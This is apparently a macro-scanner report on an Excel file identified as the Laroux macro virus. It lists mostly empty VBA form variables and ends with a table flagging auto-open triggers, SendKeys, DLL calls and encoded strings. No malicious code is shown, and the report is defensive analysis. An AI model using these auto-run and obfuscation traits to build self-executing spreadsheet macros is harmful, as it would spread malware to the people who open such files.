VBA FORM Variable "b'Qued'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Shenbq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'qx'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Shenbq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'nx\x9a['" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Uf_ts'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'\xd6S\x88m'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Uf_ts'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Uf_ts'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'sb_w'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Uf_ts/i17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'sb_s'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Uf_ts/i17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'zeng'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/biandb'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'jiang'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/biandb'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'bian'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/biandb'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/biandb'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Qued'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/biandb'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'qx'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/biandb'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox3'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |ComboBox5_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |Renybj_Change       |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

